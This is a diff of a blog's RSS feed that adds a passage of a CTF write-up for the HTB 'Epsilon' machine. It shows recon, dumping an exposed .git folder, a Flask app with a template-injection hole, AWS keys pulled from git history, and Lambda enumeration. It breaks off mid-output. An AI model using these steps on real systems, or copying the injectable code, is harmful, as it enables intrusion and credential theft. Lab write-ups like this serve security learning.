@@ -4,8 +4,668 @@
         <link>/posts/</link>
         <description>Recent content in Posts on Hello World. I am Dito Prabowo</description>
         <generator>Hugo -- gohugo.io</generator>
-        <lastBuildDate>Tue, 26 Oct 2021 19:35:16 +0700</lastBuildDate>
+        <lastBuildDate>Wed, 24 Nov 2021 14:21:47 +0700</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB UNI CTF - Cloud -  Epsilon Writeup</title>
+            <link>/posts/htb-uni-ctf-epsilon-writeup/</link>
+            <pubDate>Wed, 24 Nov 2021 14:21:47 +0700</pubDate>
+            
+            <guid>/posts/htb-uni-ctf-epsilon-writeup/</guid>
+            <description>Intro One of the local shops in your city is realising new costumes. Go grab them before they run out as the available stock is very limited.
+TLDR  Port 80 exposed public .git folder, dump it Found aws access key, use to get lambda function Found jwt secret key for app, use this to get admin login SSTI in app endpoint /order, get RCE and flag  Recon Nmap Open 10.</description>
+            <content type="html"><![CDATA[<h1 id="intro">Intro</h1>
+<p>One of the local shops in your city is realising new costumes. Go grab them before they run out as the available stock is very limited.</p>
+<h1 id="tldr">TLDR</h1>
+<ul>
+<li>Port 80 exposed public <code>.git</code> folder, dump it</li>
+<li>Found aws access key, use to get lambda function</li>
+<li>Found jwt secret key for app, use this to get admin login</li>
+<li>SSTI in app endpoint <code>/order</code>, get RCE and flag</li>
+</ul>
+<h1 id="recon">Recon</h1>
+<h2 id="nmap">Nmap</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Open <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">22</span>
+Open <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">80</span>
+Open <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span>
+
+PORT     STATE SERVICE REASON  VERSION
+<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp   open  ssh     syn<span style="color:#f92672">-</span>ack OpenSSH <span style="color:#ae81ff">8.2</span>p1 Ubuntu <span style="color:#ae81ff">4</span>ubuntu0<span style="color:#ae81ff">.2</span> (Ubuntu Linux; protocol <span style="color:#ae81ff">2.0</span>)
+<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp   open  http    syn<span style="color:#f92672">-</span>ack Apache httpd <span style="color:#ae81ff">2.4.41</span>
+<span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>git:
+<span style="color:#f92672">|</span>   <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">80</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>
+<span style="color:#f92672">|</span>     Git repository found<span style="color:#960050;background-color:#1e0010">!</span>
+<span style="color:#f92672">|</span>     Repository description: Unnamed repository; edit this file <span style="color:#e6db74">&#39;description&#39;</span> to name the<span style="color:#f92672">...</span>
+<span style="color:#f92672">|</span>_    Last commit message: Updating Tracking API  <span style="color:#75715e"># Please enter the commit message for...</span>
+<span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>methods:
+<span style="color:#f92672">|</span>_  Supported Methods: OPTIONS HEAD GET POST
+<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: Apache<span style="color:#f92672">/</span><span style="color:#ae81ff">2.4.41</span> (Ubuntu)
+<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: <span style="color:#ae81ff">403</span> Forbidden
+<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span>tcp open  http    syn<span style="color:#f92672">-</span>ack Werkzeug httpd <span style="color:#ae81ff">2.0.2</span> (Python <span style="color:#ae81ff">3.8.10</span>)
+<span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>methods:
+<span style="color:#f92672">|</span>_  Supported Methods: POST HEAD OPTIONS GET
+<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: Werkzeug<span style="color:#f92672">/</span><span style="color:#ae81ff">2.0.2</span> Python<span style="color:#f92672">/</span><span style="color:#ae81ff">3.8.10</span>
+<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Costume Shop
+Service Info: Host: <span style="color:#ae81ff">127.0.1.1</span>; OS: Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:linux_kernel
+</code></pre></div><h2 id="git-dumper">Git Dumper</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">~/.</span>local<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>git<span style="color:#f92672">-</span>dumper http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git <span style="color:#f92672">.</span>
+[<span style="color:#f92672">-</span>] Testing http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>HEAD [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Testing http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span> [<span style="color:#ae81ff">403</span>]
+[<span style="color:#f92672">-</span>] Fetching common files
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>description [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>applypatch<span style="color:#f92672">-</span>msg<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>post<span style="color:#f92672">-</span>update<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>pre<span style="color:#f92672">-</span>applypatch<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>post<span style="color:#f92672">-</span>receive<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">404</span>]
+[<span style="color:#f92672">-</span>] http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>post<span style="color:#f92672">-</span>receive<span style="color:#f92672">.</span>sample responded <span style="color:#66d9ef">with</span> status code <span style="color:#ae81ff">404</span>
+<span style="color:#f92672">...</span>
+[<span style="color:#f92672">-</span>] Finding packs
+[<span style="color:#f92672">-</span>] Finding objects
+[<span style="color:#f92672">-</span>] Fetching objects
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">5</span>c<span style="color:#f92672">/</span><span style="color:#ae81ff">52105750831385</span>d4756111e1103957ac599d02 [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>b1<span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>dd06d56ac760efbbb5d254ea43bf9beb56d2d [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">00</span><span style="color:#f92672">/</span><span style="color:#ae81ff">00000000000000000000000000000000000000</span> [<span style="color:#ae81ff">404</span>]
+[<span style="color:#f92672">-</span>] http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">00</span><span style="color:#f92672">/</span><span style="color:#ae81ff">00000000000000000000000000000000000000</span> responded <span style="color:#66d9ef">with</span> status code <span style="color:#ae81ff">404</span>
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>c5<span style="color:#f92672">/</span><span style="color:#ae81ff">1441640</span>fd25e9fba42725147595b5918eba0f1 [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">7</span>c<span style="color:#f92672">/</span>f92a7a09e523c1c667d13847c9ba22464412f3 [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>df<span style="color:#f92672">/</span>dfa17ca5701b1dca5069b6c3f705a038f4361e [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>c6<span style="color:#f92672">/</span><span style="color:#ae81ff">22771686</span>bd74c16ece91193d29f85b5f9ffa91 [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>ce<span style="color:#f92672">/</span><span style="color:#ae81ff">401</span>ccecf421ff19bf43fafe8a60a0d0f0682d0 [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>d<span style="color:#f92672">/</span><span style="color:#ae81ff">3</span>b52e153c7d5380b183bbbb51f5d4020944630 [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">65</span><span style="color:#f92672">/</span>b80f62da28254f67f0bea392057fd7d2330e2d [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>ab<span style="color:#f92672">/</span><span style="color:#ae81ff">07</span>f7cdc7f410b8c8f848ee5674ec550ecb61ca [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>b5<span style="color:#f92672">/</span>f4c99c772eeb629e53d284275458d75ed9a010 [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>cf<span style="color:#f92672">/</span><span style="color:#ae81ff">489</span>a3776d2bf87ac32de4579e852a4dc116ce8 [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">54</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5</span>f6fe2204336c1ea21720cbaa47572eb566e34 [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>fe<span style="color:#f92672">/</span>d7ab97cf361914f688f0e4f2d3adfafd1d7dca [<span style="color:#ae81ff">200</span>]
+[<span style="color:#f92672">-</span>] Running git checkout <span style="color:#f92672">.</span>
+
+</code></pre></div><p>found 2 file <code>server.py</code> and <code>track_api_CR_148.py</code> but cant find real secret key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">server<span style="color:#f92672">.</span>py
+
+<span style="color:#75715e">#!/usr/bin/python3</span>
+
+<span style="color:#f92672">import</span> jwt
+<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+app <span style="color:#f92672">=</span> Flask(__name__)
+secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;secret_key&gt;&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_jwt</span>(token,key):
+        <span style="color:#66d9ef">try</span>:
+                username<span style="color:#f92672">=</span>jwt<span style="color:#f92672">.</span>decode(token,key,algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;HS256&#39;</span>,])[<span style="color:#e6db74">&#39;username&#39;</span>]
+                <span style="color:#66d9ef">if</span> username:
+                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+                <span style="color:#66d9ef">else</span>:
+                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+        <span style="color:#66d9ef">except</span>:
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;POST&#34;</span>:
+                <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">and</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;password&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;admin&#34;</span>:
+                        res <span style="color:#f92672">=</span> make_response()
+                        username<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;username&#39;</span>]
+                        token<span style="color:#f92672">=</span>jwt<span style="color:#f92672">.</span>encode({<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>},secret,algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>)
+                        res<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#34;auth&#34;</span>,token)
+                        res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;location&#39;</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/home&#39;</span>
+                        <span style="color:#66d9ef">return</span> res,<span style="color:#ae81ff">302</span>
+                <span style="color:#66d9ef">else</span>:
+                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
+        <span style="color:#66d9ef">else</span>:
+                <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/home&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">home</span>():
+        <span style="color:#66d9ef">if</span> verify_jwt(request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;auth&#39;</span>),secret):
+                <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;home.html&#39;</span>)
+        <span style="color:#66d9ef">else</span>:
+                <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>,code<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>)
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/track&#34;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">track</span>():
+        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;POST&#34;</span>:
+                <span style="color:#66d9ef">if</span> verify_jwt(request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;auth&#39;</span>),secret):
+                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;track.html&#39;</span>,message<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+                <span style="color:#66d9ef">else</span>:
+                        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>,code<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>)
+        <span style="color:#66d9ef">else</span>:
+                <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;track.html&#39;</span>)
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/order&#39;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">order</span>():
+        <span style="color:#66d9ef">if</span> verify_jwt(request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;auth&#39;</span>),secret):
+                <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;POST&#34;</span>:
+                        costume<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;costume&#34;</span>]
+                        message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">                        Your order of &#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34; has been placed successfully.
+</span><span style="color:#e6db74">                        &#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(costume)
+                        tmpl<span style="color:#f92672">=</span>render_template_string(message,costume<span style="color:#f92672">=</span>costume)
+                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;order.html&#39;</span>,message<span style="color:#f92672">=</span>tmpl)
+                <span style="color:#66d9ef">else</span>:
+                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;order.html&#39;</span>)
+        <span style="color:#66d9ef">else</span>:
+                <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>,code<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>)
+app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;true&#39;</span>)
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">track_api_CR_148<span style="color:#f92672">.</span>py
+<span style="color:#f92672">import</span> io
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">from</span> zipfile <span style="color:#f92672">import</span> ZipFile
+<span style="color:#f92672">from</span> boto3.session <span style="color:#f92672">import</span> Session
+
+
+session <span style="color:#f92672">=</span> Session(
+    aws_access_key_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_access_key_id&gt;&#39;</span>,
+    aws_secret_access_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_secret_access_key&gt;&#39;</span>,
+    region_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;us-east-1&#39;</span>,
+    endpoint_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://cloud.epsilon.htb&#39;</span>)
+aws_lambda <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>client(<span style="color:#e6db74">&#39;lambda&#39;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">files_to_zip</span>(path):
+    <span style="color:#66d9ef">for</span> root, dirs, files <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>walk(path):
+        <span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> files:
+            full_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(root, f)
+            archive_name <span style="color:#f92672">=</span> full_path[len(path) <span style="color:#f92672">+</span> len(os<span style="color:#f92672">.</span>sep):]
+            <span style="color:#66d9ef">yield</span> full_path, archive_name
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_zip_file_bytes</span>(path):
+    buf <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>BytesIO()
+    <span style="color:#66d9ef">with</span> ZipFile(buf, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> z:
+        <span style="color:#66d9ef">for</span> full_path, archive_name <span style="color:#f92672">in</span> files_to_zip(path<span style="color:#f92672">=</span>path):
+            z<span style="color:#f92672">.</span>write(full_path, archive_name)
+    <span style="color:#66d9ef">return</span> buf<span style="color:#f92672">.</span>getvalue()
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update_lambda</span>(lambda_name, lambda_code_path):
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(lambda_code_path):
+        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#39;Lambda directory does not exist: </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(lambda_code_path))
+    aws_lambda<span style="color:#f92672">.</span>update_function_code(
+        FunctionName<span style="color:#f92672">=</span>lambda_name,
+        ZipFile<span style="color:#f92672">=</span>make_zip_file_bytes(path<span style="color:#f92672">=</span>lambda_code_path))
+</code></pre></div><p>Enumerating on git log, found aws access key that can used to access.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git log
+commit c622771686bd74c16ece91193d29f85b5f9ffa91 <span style="color:#f92672">(</span>HEAD -&gt; master<span style="color:#f92672">)</span>
+Author: root &lt;root@epsilon.htb&gt;
+Date:   Wed Nov <span style="color:#ae81ff">17</span> 17:41:07 <span style="color:#ae81ff">2021</span> +0000
+
+    Fixed Typo
+
+commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
+Author: root &lt;root@epsilon.htb&gt;
+Date:   Wed Nov <span style="color:#ae81ff">17</span> 10:02:59 <span style="color:#ae81ff">2021</span> +0000
+
+    Adding Costume Site
+
+commit c51441640fd25e9fba42725147595b5918eba0f1
+Author: root &lt;root@epsilon.htb&gt;
+Date:   Wed Nov <span style="color:#ae81ff">17</span> 10:00:58 <span style="color:#ae81ff">2021</span> +0000
+
+    Updatig Tracking API
+
+commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
+Author: root &lt;root@epsilon.htb&gt;
+Date:   Wed Nov <span style="color:#ae81ff">17</span> 10:00:28 <span style="color:#ae81ff">2021</span> +0000
+
+    Adding Tracking API Module
+
+
+$ git diff master 7cf92a7a09e523c1c667d13847c9ba22464412f3
+
+diff --git a/track_api_CR_148.py b/track_api_CR_148.py
+index 8d3b52e..fed7ab9 <span style="color:#ae81ff">100644</span>
+--- a/track_api_CR_148.py
++++ b/track_api_CR_148.py
+@@ -5,11 +5,11 @@ from boto3.session import Session
+...
+-    aws_access_key_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_access_key_id&gt;&#39;</span>,
+-    aws_secret_access_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_secret_access_key&gt;&#39;</span>,
++    aws_access_key_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;AQLA5M37BDN6FJP76TDC&#39;</span>,
++    aws_secret_access_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A&#39;</span>,
+     region_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;us-east-1&#39;</span>,
+-    endpoint_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://cloud.epsilon.htb&#39;</span><span style="color:#f92672">)</span>
+-aws_lambda <span style="color:#f92672">=</span> session.client<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;lambda&#39;</span><span style="color:#f92672">)</span>
++    endpoint_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://cloud.epsilong.htb&#39;</span><span style="color:#f92672">)</span>
++aws_lambda <span style="color:#f92672">=</span> session.client<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;lambda&#39;</span><span style="color:#f92672">)</span>
+
+</code></pre></div><h1 id="pwning">PWNING</h1>
+<p>we get aws cred and there is endpoint aws lambda in code, try to enumerate and get function from aws lambda.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export AWS_ACCESS_KEY_ID<span style="color:#f92672">=</span>AQLA5M37BDN6FJP76TDC                                                                                    
+export AWS_SECRET_ACCESS_KEY<span style="color:#f92672">=</span>OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A  
+export AWS_REGION<span style="color:#f92672">=</span>us-east-1
+
+aws --endpoint-url<span style="color:#f92672">=</span>http://cloud.epsilon.htb/ lambda list-functions
+
+<span style="color:#f92672">{</span>
+    <span style="color:#e6db74">&#34;Functions&#34;</span>: <span style="color:#f92672">[</span>
+        <span style="color:#f92672">{</span>
+            <span style="color:#e6db74">&#34;FunctionName&#34;</span>: <span style="color:#e6db74">&#34;costume_shop_v1&#34;</span>,
+            <span style="color:#e6db74">&#34;FunctionArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&#34;</span>,
+            <span style="color:#e6db74">&#34;Runtime&#34;</span>: <span style="color:#e6db74">&#34;python3.7&#34;</span>,
+            <span style="color:#e6db74">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::123456789012:role/service-role/dev&#34;</span>,
+            <span style="color:#e6db74">&#34;Handler&#34;</span>: <span style="color:#e6db74">&#34;my-function.handler&#34;</span>,
+            <span style="color:#e6db74">&#34;CodeSize&#34;</span>: 478,
+            <span style="color:#e6db74">&#34;Description&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+            <span style="color:#e6db74">&#34;Timeout&#34;</span>: 3,
+            <span style="color:#e6db74">&#34;LastModified&#34;</span>: <span style="color:#e6db74">&#34;2021-11-24T07:24:25.324+0000&#34;</span>,
+            <span style="color:#e6db74">&#34;CodeSha256&#34;</span>: <span style="color:#e6db74">&#34;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&#34;</span>,
+            <span style="color:#e6db74">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;</span>$LATEST<span style="color:#e6db74">&#34;</span>,
+            <span style="color:#e6db74">&#34;VpcConfig&#34;</span>: <span style="color:#f92672">{}</span>,
+            <span style="color:#e6db74">&#34;TracingConfig&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;Mode&#34;</span>: <span style="color:#e6db74">&#34;PassThrough&#34;</span>
+            <span style="color:#f92672">}</span>,
+            <span style="color:#e6db74">&#34;RevisionId&#34;</span>: <span style="color:#e6db74">&#34;78b95307-f240-40d3-acd2-373ddccfdbe2&#34;</span>,
+            <span style="color:#e6db74">&#34;State&#34;</span>: <span style="color:#e6db74">&#34;Active&#34;</span>,
+            <span style="color:#e6db74">&#34;LastUpdateStatus&#34;</span>: <span style="color:#e6db74">&#34;Successful&#34;</span>,
